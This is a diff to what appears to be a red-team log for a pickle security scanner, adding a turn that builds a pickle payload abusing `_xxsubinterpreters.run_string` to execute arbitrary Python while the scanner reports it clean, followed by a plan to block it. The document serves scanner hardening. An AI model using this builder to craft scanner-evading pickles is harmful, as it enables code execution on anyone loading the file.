@@ -6760,3 +6760,138 @@ Blocking plan:
 Performance note: two exact entries in the existing sorted policy table and no
 Tcl script parsing, command-word inspection, constructor blocking, or broad
 `_tkinter` wildcard block.
+
+## Turn 121 - `_xxsubinterpreters.run_string` arbitrary Python execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using CPython's built-in
+subinterpreter module to execute attacker-controlled Python source in a fresh
+interpreter.
+
+Candidate payload:
+
+- Call `_xxsubinterpreters.create()` to allocate a new subinterpreter and memo
+  its returned `InterpreterID`.
+- Call `_xxsubinterpreters.run_string(interpreter_id, code)` with attacker
+  source text.
+- The proof source uses `open(marker, "w").write("owned-by-subinterp")`.
+  This demonstrates arbitrary Python source execution without referencing
+  dangerous Python execution globals such as `builtins.exec`,
+  `builtins.eval`, `os.system`, `subprocess.run`, or import machinery in the
+  pickle global stream.
+- The source string is not Python-shaped for the scanner's current suspicious
+  string patterns: it contains no `import`, no `exec(`, no `eval(`, no
+  `os.system(...)`, and no `subprocess.*(...)`.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_subinterp_marker")
+source = f"open({str(marker)!r}, 'w').write('owned-by-subinterp')"
+
+control = b"".join(
+    [
+        b"\x80\x04",
+        sg("_xxsubinterpreters", "create"),
+        b")R.",
+    ]
+)
+
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("_xxsubinterpreters", "create"),
+        b")R\x94",
+        sg("_xxsubinterpreters", "run_string"),
+        b"h\x00",
+        text(source),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 with `_xxsubinterpreters` available:
+
+- Constructor control scanner result: `len=34`, `status=complete`,
+  `verdict=clean`, `is_clean=True`, `findings=[]`, `notices=[]`,
+  `errors=[]`
+- Constructor control coverage: `bytes_scanned=34`, `bytes_total=34`,
+  `opcode_count=7`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Constructor control import references: `_xxsubinterpreters.create` with
+  `is_dangerous=False`
+- Constructor control string heuristic matches: `[]`
+- Constructor control runtime: before unpickle the marker is absent; after
+  `pickle.loads(control)`, the result is `InterpreterID(1)` and the marker is
+  still absent.
+- RCE scanner result: `len=192`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- RCE coverage: `bytes_scanned=192`, `bytes_total=192`, `opcode_count=15`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- RCE import references: `_xxsubinterpreters.create` and
+  `_xxsubinterpreters.run_string`, both with `is_dangerous=False`
+- RCE string heuristic matches: `[]`
+- RCE runtime: before unpickle the marker is absent; after
+  `pickle.loads(payload)`, the result is `None` and the marker exists with
+  content `owned-by-subinterp`.
+
+RCE mechanism:
+
+- `_xxsubinterpreters.run_string()` is an explicit CPython source-execution
+  primitive. It evaluates attacker-controlled Python source inside the chosen
+  subinterpreter.
+- The code execution does not go through blocked pickle globals like
+  `builtins.exec`, `builtins.eval`, `os`, `subprocess`, `runpy`, or
+  `importlib`.
+- The scanner sees only a clean built-in module global plus a text literal
+  that does not match the current suspicious-string needles.
+
+Why the scanner missed it:
+
+- `_xxsubinterpreters` is not a wildcard-dangerous module.
+- `_xxsubinterpreters.create` and `_xxsubinterpreters.run_string` are absent
+  from `DANGEROUS_GLOBALS`.
+- The payload has complete opcode coverage, no scan errors, no findings, no
+  notices, and no suspicious-string matches.
+
+Performance note: the focused next block should add an exact dangerous-global
+entry for `_xxsubinterpreters.run_string`. Blocking constructor-only
+`_xxsubinterpreters.create` is optional but higher false-positive risk because
+interpreter allocation alone does not execute attacker source. An exact
+`run_string` entry keeps the hot path to sorted-table lookup and avoids source
+parsing or a broad `_xxsubinterpreters` wildcard block.
+
+## Turn 122 - Block `_xxsubinterpreters.run_string`
+
+Blocking plan:
+
+- Add an exact dangerous-global entry for
+  `_xxsubinterpreters.run_string`.
+- Leave `_xxsubinterpreters.create` allowed. Constructor-only controls allocate
+  an interpreter id but do not execute attacker source without a later
+  execution dispatch.
+- Add a CPython oracle regression for the Turn 121 payload. The control
+  remains clean and returns an `InterpreterID` without touching the marker; the
+  active payload is malicious and still writes the marker through Python source
+  executed in the subinterpreter.
+- Skip the runtime regression when `_xxsubinterpreters` is unavailable in the
+  Python build.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one exact entry in the existing sorted policy table and no
+Python source parsing, constructor blocking, or broad `_xxsubinterpreters`
+wildcard block.
